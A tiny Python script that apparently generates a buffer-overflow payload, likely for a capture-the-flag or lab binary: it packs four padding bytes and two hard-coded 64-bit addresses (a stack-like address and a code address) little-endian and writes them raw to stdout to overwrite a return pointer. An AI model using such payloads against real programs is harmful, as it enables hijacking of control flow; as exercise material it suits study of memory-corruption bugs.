import sys
from struct import pack
address1 = b'\x00\x00\x07\xff\xff\xff\x6c\x11'
address2 = b'\x00\x00\x00\x00\x00\x40\x1e\x46'
hex1 = 0x000007ffffff6c11
hex2 = 0x0000000000401e46
fullstr = b'\x00\x00\x00\x00' + hex1.to_bytes(8,'little') + hex2.to_bytes(8,'little')
sys.stdout.buffer.write(fullstr)
